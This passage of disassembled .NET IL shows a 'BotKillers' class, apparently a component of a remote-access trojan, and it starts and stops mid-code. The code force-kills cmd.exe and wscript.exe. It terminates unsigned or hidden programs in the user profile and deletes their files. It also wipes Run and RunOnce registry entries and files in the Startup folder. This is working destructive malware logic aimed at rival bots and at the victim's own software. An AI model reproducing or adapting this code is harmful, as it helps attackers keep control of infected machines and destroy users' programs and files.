    .field public static literal valuetype BotKillers/WinVerifyTrustResult ProviderUnknown = int32(0x800B0001)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ActionUnknown = int32(0x800B0002)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectFormUnknown = int32(0x800B0003)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectNotTrusted = int32(0x800B0004)
  } // end of class WinVerifyTrustResult

  .class auto ansi sealed nested public beforefieldinit WinTrust
         extends [mscorlib]System.Object
  {
    .field private static initonly native int INVALID_HANDLE_VALUE
    .field private static literal string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
    .method private specialname rtspecialname static 
            void  .cctor() cil managed
    {
      // Code size       12 (0xc)
      .maxstack  8
      IL_0000:  ldc.i4.m1
      IL_0001:  newobj     instance void [mscorlib]System.IntPtr::.ctor(int32)
      IL_0006:  stsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
      IL_000b:  ret
    } // end of method WinTrust::.cctor

    .method private static pinvokeimpl("wintrust.dll" nomangle unicode winapi) 
            valuetype BotKillers/WinVerifyTrustResult 
            WinVerifyTrust([in] native int hwnd,
                           [in] valuetype [mscorlib]System.Guid  marshal( lpstruct) pgActionID,
                           [in] class BotKillers/WinTrustData pWVTData) cil managed preservesig
    {
    }
    .method public static bool  VerifyEmbeddedSignature(string fileName) cil managed
    {
      // Code size       52 (0x34)
      .maxstack  3
      .locals init (bool V_0,
               class BotKillers/WinTrustData V_1,
               valuetype [mscorlib]System.Guid V_2)
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  newobj     instance void BotKillers/WinTrustData::.ctor(string)
        IL_0006:  stloc.1
        IL_0007:  ldstr      "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
        IL_000c:  newobj     instance void [mscorlib]System.Guid::.ctor(string)
        IL_0011:  stloc.2
        IL_0012:  ldsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
        IL_0017:  ldloc.2
        IL_0018:  ldloc.1
        IL_0019:  call       valuetype BotKillers/WinVerifyTrustResult BotKillers/WinTrust::WinVerifyTrust(native int,
                                                                                                           valuetype [mscorlib]System.Guid,
                                                                                                           class BotKillers/WinTrustData)
        IL_001e:  ldc.i4.0
        IL_001f:  ceq
        IL_0021:  stloc.0
        IL_0022:  leave.s    IL_0032

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0029:  ldc.i4.0
        IL_002a:  stloc.0
        IL_002b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0030:  leave.s    IL_0032

      }  // end handler
      IL_0032:  ldloc.0
      IL_0033:  ret
    } // end of method WinTrust::VerifyEmbeddedSignature

    .method private specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method WinTrust::.ctor

  } // end of class WinTrust

  .field private static int32 ProccessKilled
  .field private static int32 Startupkilled
  .field private static string hio
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     int32 BotKillers::ProccessKilled
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     int32 BotKillers::Startupkilled
    IL_000c:  ret
  } // end of method BotKillers::.cctor

  .method private static pinvokeimpl("user32.dll" lasterr winapi) 
          bool  marshal( bool)  IsWindowVisible(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method public static void  RunStandardBotKiller() cil managed
  {
    // Code size       189 (0xbd)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "TASKKILL /F /IM wscript.exe"
      IL_000e:  ldc.i4.0
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.m1
      IL_0011:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0016:  pop
      IL_0017:  ldc.i4.3
      IL_0018:  stloc.2
      IL_0019:  ldstr      "TASKKILL /F /IM cmd.exe"
      IL_001e:  ldc.i4.0
      IL_001f:  ldc.i4.0
      IL_0020:  ldc.i4.m1
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0026:  pop
      IL_0027:  ldc.i4.4
      IL_0028:  stloc.2
      IL_0029:  call       void BotKillers::ScanProcess()
      IL_002e:  ldc.i4.5
      IL_002f:  stloc.2
      IL_0030:  call       void BotKillers::RunStartupKiller()
      IL_0035:  ldc.i4.6
      IL_0036:  stloc.2
      IL_0037:  ldc.i4.0
      IL_0038:  stsfld     int32 BotKillers::ProccessKilled
      IL_003d:  ldc.i4.7
      IL_003e:  stloc.2
      IL_003f:  ldc.i4.0
      IL_0040:  stsfld     int32 BotKillers::Startupkilled
      IL_0045:  leave.s    IL_00b4

      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.1
      IL_0049:  add
      IL_004a:  ldc.i4.0
      IL_004b:  stloc.1
      IL_004c:  switch     ( 
                            IL_0075,
                            IL_0000,
                            IL_0007,
                            IL_0017,
                            IL_0027,
                            IL_002e,
                            IL_0035,
                            IL_003d,
                            IL_0045)
      IL_0075:  leave.s    IL_00a9

      IL_0077:  ldloc.2
      IL_0078:  stloc.1
      IL_0079:  ldloc.0
      IL_007a:  switch     ( 
                            IL_0087,
                            IL_0047)
      IL_0087:  leave.s    IL_00a9

    }  // end .try
    filter
    {
      IL_0089:  isinst     [mscorlib]System.Exception
      IL_008e:  ldnull
      IL_008f:  cgt.un
      IL_0091:  ldloc.0
      IL_0092:  ldc.i4.0
      IL_0093:  cgt.un
      IL_0095:  and
      IL_0096:  ldloc.1
      IL_0097:  ldc.i4.0
      IL_0098:  ceq
      IL_009a:  and
      IL_009b:  endfilter
    }  // end filter
    {  // handler
      IL_009d:  castclass  [mscorlib]System.Exception
      IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a7:  leave.s    IL_0077

    }  // end handler
    IL_00a9:  ldc.i4     0x800a0033
    IL_00ae:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00b3:  throw

    IL_00b4:  ldloc.1
    IL_00b5:  brfalse.s  IL_00bc

    IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00bc:  ret
  } // end of method BotKillers::RunStandardBotKiller

  .method public static void  ScanProcess() cil managed
  {
    // Code size       128 (0x80)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string V_1,
             int32 V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process V_4)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_0005:  stloc.0
      IL_0006:  ldloc.0
      IL_0007:  ldlen
      IL_0008:  conv.i4
      IL_0009:  ldc.i4.1
      IL_000a:  sub.ovf
      IL_000b:  stloc.2
      IL_000c:  ldc.i4.0
      IL_000d:  stloc.3
      IL_000e:  br.s       IL_006d

      IL_0010:  ldloc.0
      IL_0011:  ldloc.3
      IL_0012:  ldelem.ref
      IL_0013:  stloc.s    V_4
      .try
      {
        IL_0015:  ldloc.s    V_4
        IL_0017:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
        IL_001c:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
        IL_0021:  call       string [mscorlib]System.IO.Path::GetFullPath(string)
        IL_0026:  stloc.1
        IL_0027:  ldloc.1
        IL_0028:  call       bool BotKillers::IsFileMalicious(string)
        IL_002d:  brfalse.s  IL_005b

        IL_002f:  ldloc.s    V_4
        IL_0031:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
        IL_0036:  call       bool BotKillers::WindowIsVisible(string)
        IL_003b:  brtrue.s   IL_005b

        IL_003d:  ldloc.s    V_4
        IL_003f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_0044:  call       void BotKillers::TerminateProcess(int32)
        IL_0049:  ldloc.1
        IL_004a:  call       void BotKillers::DestroyFile(string)
        IL_004f:  ldsfld     int32 BotKillers::ProccessKilled
        IL_0054:  ldc.i4.1
        IL_0055:  add.ovf
        IL_0056:  stsfld     int32 BotKillers::ProccessKilled
        IL_005b:  leave.s    IL_0069

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0067:  leave.s    IL_0069

      }  // end handler
      IL_0069:  ldloc.3
      IL_006a:  ldc.i4.1
      IL_006b:  add.ovf
      IL_006c:  stloc.3
      IL_006d:  ldloc.3
      IL_006e:  ldloc.2
      IL_006f:  ble.s      IL_0010

      IL_0071:  leave.s    IL_007f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0073:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007d:  leave.s    IL_007f

    }  // end handler
    IL_007f:  ret
  } // end of method BotKillers::ScanProcess

  .method public static bool  IsFileMalicious(string fileloc) cil managed
  {
    // Code size       489 (0x1e9)
    .maxstack  3
    .locals init (bool V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             valuetype [mscorlib]System.IO.FileAttributes V_4)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.1
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.3
      IL_0009:  ldarg.0
      IL_000a:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_000f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0014:  brfalse.s  IL_001f

      IL_0016:  ldc.i4.3
      IL_0017:  stloc.3
      IL_0018:  ldc.i4.0
      IL_0019:  stloc.0
      IL_001a:  br         IL_0125

      IL_001f:  ldc.i4.4
      IL_0020:  stloc.3
      IL_0021:  ldarg.0
      IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0027:  ldstr      "malware"
      IL_002c:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0031:  brfalse.s  IL_003b

      IL_0033:  ldc.i4.5
      IL_0034:  stloc.3
      IL_0035:  ldarg.0
      IL_0036:  call       void BotKillers::DestroyFile(string)
      IL_003b:  ldc.i4.6
      IL_003c:  stloc.3
      IL_003d:  ldarg.0
      IL_003e:  ldstr      "Google.com"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_0053

      IL_004a:  ldc.i4.7
      IL_004b:  stloc.3
      IL_004c:  ldc.i4.0
      IL_004d:  stloc.0
      IL_004e:  br         IL_0125

      IL_0053:  ldc.i4.8
      IL_0054:  stloc.3
      IL_0055:  ldarg.0
      IL_0056:  ldstr      "Microsoft.com"
      IL_005b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0060:  brfalse.s  IL_006c

      IL_0062:  ldc.i4.s   9
      IL_0064:  stloc.3
      IL_0065:  ldc.i4.0
      IL_0066:  stloc.0
      IL_0067:  br         IL_0125

      IL_006c:  ldc.i4.s   10
      IL_006e:  stloc.3
      IL_006f:  ldarg.0
      IL_0070:  ldstr      "cmd"
      IL_0075:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_007a:  brfalse.s  IL_0086

      IL_007c:  ldc.i4.s   11
      IL_007e:  stloc.3
      IL_007f:  ldc.i4.1
      IL_0080:  stloc.0
      IL_0081:  br         IL_0125

      IL_0086:  ldc.i4.s   12
      IL_0088:  stloc.3
      IL_0089:  ldarg.0
      IL_008a:  ldstr      "wscript"
      IL_008f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0094:  brfalse.s  IL_00a0

      IL_0096:  ldc.i4.s   13
      IL_0098:  stloc.3
      IL_0099:  ldc.i4.1
      IL_009a:  stloc.0
      IL_009b:  br         IL_0125

      IL_00a0:  ldc.i4.s   14
      IL_00a2:  stloc.3
      IL_00a3:  ldarg.0
      IL_00a4:  call       string [mscorlib]System.Runtime.InteropServices.RuntimeEnvironment::GetRuntimeDirectory()
      IL_00a9:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00ae:  brfalse.s  IL_00b7

      IL_00b0:  ldc.i4.s   15
      IL_00b2:  stloc.3
      IL_00b3:  ldc.i4.1
      IL_00b4:  stloc.0
      IL_00b5:  br.s       IL_0125

      IL_00b7:  ldc.i4.s   16
      IL_00b9:  stloc.3
      IL_00ba:  ldarg.0
      IL_00bb:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
      IL_00c0:  brfalse.s  IL_00c9

      IL_00c2:  ldc.i4.s   17
      IL_00c4:  stloc.3
      IL_00c5:  ldc.i4.0
      IL_00c6:  stloc.0
      IL_00c7:  br.s       IL_0125

      IL_00c9:  ldc.i4.s   18
      IL_00cb:  stloc.3
      IL_00cc:  ldarg.0
      IL_00cd:  ldstr      "USERPROFILE"
      IL_00d2:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
      IL_00d7:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00dc:  ldarg.0
      IL_00dd:  ldc.i4.s   35
      IL_00df:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00e9:  or
      IL_00ea:  brfalse.s  IL_00f3

      IL_00ec:  ldc.i4.s   19
      IL_00ee:  stloc.3
      IL_00ef:  ldc.i4.1
      IL_00f0:  stloc.0
      IL_00f1:  br.s       IL_0125

      IL_00f3:  ldc.i4.s   20
      IL_00f5:  stloc.3
      IL_00f6:  ldarg.0
      IL_00f7:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
      IL_00fc:  stloc.s    V_4
      IL_00fe:  ldc.i4.s   21
      IL_0100:  stloc.3
      IL_0101:  ldloc.s    V_4
      IL_0103:  ldc.i4.4
      IL_0104:  and
      IL_0105:  ldc.i4.4
      IL_0106:  bne.un.s   IL_010f

      IL_0108:  ldc.i4.s   22
      IL_010a:  stloc.3
      IL_010b:  ldc.i4.1
      IL_010c:  stloc.0
      IL_010d:  br.s       IL_0125

      IL_010f:  ldc.i4.s   23
      IL_0111:  stloc.3
      IL_0112:  ldloc.s    V_4
      IL_0114:  ldc.i4.2
      IL_0115:  and
      IL_0116:  ldc.i4.2
      IL_0117:  bne.un.s   IL_0120

      IL_0119:  ldc.i4.s   24
      IL_011b:  stloc.3
      IL_011c:  ldc.i4.1
      IL_011d:  stloc.0
      IL_011e:  br.s       IL_0125

      IL_0120:  ldc.i4.s   25
      IL_0122:  stloc.3
      IL_0123:  ldc.i4.0
      IL_0124:  stloc.0
      IL_0125:  leave      IL_01df

      IL_012a:  ldloc.2
      IL_012b:  ldc.i4.1
      IL_012c:  add
      IL_012d:  ldc.i4.0
      IL_012e:  stloc.2
      IL_012f:  switch     ( 
                            IL_01a0,
                            IL_0000,
                            IL_0007,
                            IL_0016,
                            IL_001f,
                            IL_0033,
                            IL_003b,
                            IL_004a,
                            IL_0053,
                            IL_0062,
                            IL_006c,
                            IL_007c,
                            IL_0086,
                            IL_0096,
                            IL_00a0,
                            IL_00b0,
                            IL_00b7,
                            IL_00c2,
                            IL_00c9,
                            IL_00ec,
                            IL_00f3,
                            IL_00fe,
                            IL_0108,
                            IL_010f,
                            IL_0119,
                            IL_0120,
                            IL_0125)
      IL_01a0:  leave.s    IL_01d4

      IL_01a2:  ldloc.3
      IL_01a3:  stloc.2
      IL_01a4:  ldloc.1
      IL_01a5:  switch     ( 
                            IL_01b2,
                            IL_012a)
      IL_01b2:  leave.s    IL_01d4

    }  // end .try
    filter
    {
      IL_01b4:  isinst     [mscorlib]System.Exception
      IL_01b9:  ldnull
      IL_01ba:  cgt.un
      IL_01bc:  ldloc.1
      IL_01bd:  ldc.i4.0
      IL_01be:  cgt.un
      IL_01c0:  and
      IL_01c1:  ldloc.2
      IL_01c2:  ldc.i4.0
      IL_01c3:  ceq
      IL_01c5:  and
      IL_01c6:  endfilter
    }  // end filter
    {  // handler
      IL_01c8:  castclass  [mscorlib]System.Exception
      IL_01cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d2:  leave.s    IL_01a2

    }  // end handler
    IL_01d4:  ldc.i4     0x800a0033
    IL_01d9:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01de:  throw

    IL_01df:  ldloc.2
    IL_01e0:  brfalse.s  IL_01e7

    IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01e7:  ldloc.0
    IL_01e8:  ret
  } // end of method BotKillers::IsFileMalicious

  .method public static void  KillFile(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.1
      IL_0010:  ldc.i4.0
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::KillFile

  .method public static bool  WindowIsVisible(string WinTitle) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  2
    .locals init (bool V_0)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  ldarg.0
      IL_0002:  call       native int BotKillers::FindWindow(string,
                                                             string)
      IL_0007:  call       bool BotKillers::IsWindowVisible(native int)
      IL_000c:  stloc.0
      IL_000d:  leave.s    IL_001d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0014:  ldc.i4.0
      IL_0015:  stloc.0
      IL_0016:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001b:  leave.s    IL_001d

    }  // end handler
    IL_001d:  ldloc.0
    IL_001e:  ret
  } // end of method BotKillers::WindowIsVisible

  .method public static void  RunStartupKiller() cil managed
  {
    // Code size       458 (0x1ca)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             string V_3,
             class [mscorlib]System.Collections.Generic.IEnumerator`1<string> V_4,
             string V_5)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_000e:  ldc.i4.1
      IL_000f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0014:  ldc.i4.3
      IL_0015:  stloc.2
      IL_0016:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_001b:  ldc.i4.1
      IL_001c:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0021:  ldc.i4.4
      IL_0022:  stloc.2
      IL_0023:  call       bool BotKillers::IsAdmin()
      IL_0028:  brfalse.s  IL_0044

      IL_002a:  ldc.i4.5
      IL_002b:  stloc.2
      IL_002c:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_0031:  ldc.i4.2
      IL_0032:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0037:  ldc.i4.6
      IL_0038:  stloc.2
      IL_0039:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_003e:  ldc.i4.2
      IL_003f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0044:  ldc.i4.7
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.7
      IL_0047:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_004c:  ldstr      "\\"
      IL_0051:  ldsfld     string j.OK::RG
      IL_0056:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005b:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_0060:  stloc.3
      IL_0061:  ldc.i4.8
      IL_0062:  stloc.2
      IL_0063:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0068:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_006d:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0072:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0077:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_007c:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Programs()
      IL_0081:  ldstr      "\\Startup"
      IL_0086:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008b:  callvirt   instance class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string> [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::GetFiles(string)
      IL_0090:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string>::GetEnumerator()
      IL_0095:  stloc.s    V_4
      IL_0097:  br.s       IL_0111

      IL_0099:  ldloc.s    V_4
      IL_009b:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<string>::get_Current()
      IL_00a0:  stloc.s    V_5
      IL_00a2:  ldc.i4.s   9
      IL_00a4:  stloc.2
      IL_00a5:  ldloc.s    V_5
      IL_00a7:  ldsfld     string j.OK::RG
      IL_00ac:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00b1:  ldc.i4.0
      IL_00b2:  ceq
      IL_00b4:  ldloc.s    V_5
      IL_00b6:  ldloc.3
      IL_00b7:  ldstr      ".url"
      IL_00bc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00c1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00c6:  ldc.i4.0
      IL_00c7:  ceq
      IL_00c9:  and
      IL_00ca:  ldloc.s    V_5
      IL_00cc:  ldstr      ".ini"
      IL_00d1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00d6:  ldc.i4.0
      IL_00d7:  ceq
      IL_00d9:  and
      IL_00da:  brfalse.s  IL_010e

      IL_00dc:  ldc.i4.s   10
      IL_00de:  stloc.2
      IL_00df:  ldloc.s    V_5
      IL_00e1:  call       void BotKillers::DestroyFile(string)
      IL_00e6:  ldc.i4.s   11
      IL_00e8:  stloc.2
      IL_00e9:  ldc.i4.s   50
      IL_00eb:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00f0:  ldc.i4.s   12
      IL_00f2:  stloc.2
      IL_00f3:  ldloc.s    V_5
      IL_00f5:  call       void BotKillers::DestroyFile(string)
      IL_00fa:  ldc.i4.s   13
      IL_00fc:  stloc.2
      IL_00fd:  ldc.i4.s   50
      IL_00ff:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0104:  ldc.i4.s   14
      IL_0106:  stloc.2
      IL_0107:  ldloc.s    V_5
      IL_0109:  call       void BotKillers::DestroyFile(string)
      IL_010e:  ldc.i4.s   15
      IL_0110:  stloc.2
      IL_0111:  ldloc.s    V_4
      IL_0113:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0118:  brtrue     IL_0099

      IL_011d:  ldc.i4.s   16
      IL_011f:  stloc.2
      IL_0120:  ldloc.s    V_4
      IL_0122:  brfalse.s  IL_012b

      IL_0124:  ldloc.s    V_4
      IL_0126:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_012b:  leave      IL_01c1

      IL_0130:  ldloc.1
      IL_0131:  ldc.i4.1
      IL_0132:  add
      IL_0133:  ldc.i4.0
      IL_0134:  stloc.1
      IL_0135:  switch     ( 
                            IL_0182,
                            IL_0000,
                            IL_0007,
                            IL_0014,
                            IL_0021,
                            IL_002a,
                            IL_0037,
                            IL_0044,
                            IL_0061,
                            IL_00a2,
                            IL_00dc,
                            IL_00e6,
                            IL_00f0,
                            IL_00fa,
                            IL_0104,
                            IL_010e,
                            IL_011d,
                            IL_012b)
      IL_0182:  leave.s    IL_01b6

      IL_0184:  ldloc.2
      IL_0185:  stloc.1
      IL_0186:  ldloc.0
      IL_0187:  switch     ( 
                            IL_0194,
                            IL_0130)
      IL_0194:  leave.s    IL_01b6

    }  // end .try
    filter
    {
      IL_0196:  isinst     [mscorlib]System.Exception
      IL_019b:  ldnull
      IL_019c:  cgt.un
      IL_019e:  ldloc.0
      IL_019f:  ldc.i4.0
      IL_01a0:  cgt.un
      IL_01a2:  and
      IL_01a3:  ldloc.1
      IL_01a4:  ldc.i4.0
      IL_01a5:  ceq
      IL_01a7:  and
      IL_01a8:  endfilter
    }  // end filter
    {  // handler
      IL_01aa:  castclass  [mscorlib]System.Exception
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  leave.s    IL_0184

    }  // end handler
    IL_01b6:  ldc.i4     0x800a0033
    IL_01bb:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01c0:  throw

    IL_01c1:  ldloc.1
    IL_01c2:  brfalse.s  IL_01c9

    IL_01c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01c9:  ret
  } // end of method BotKillers::RunStartupKiller

  .method public static void  StartupFucker(string regkey,
                                            int32 'type') cil managed
  {
    // Code size       273 (0x111)
    .maxstack  5
    .locals init (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             string V_4)
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  ldc.i4.1
      IL_0002:  bne.un.s   IL_0010

      IL_0004:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0009:  ldarg.0
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_000f:  stloc.0
      IL_0010:  ldarg.1
      IL_0011:  ldc.i4.2
      IL_0012:  bne.un.s   IL_0020

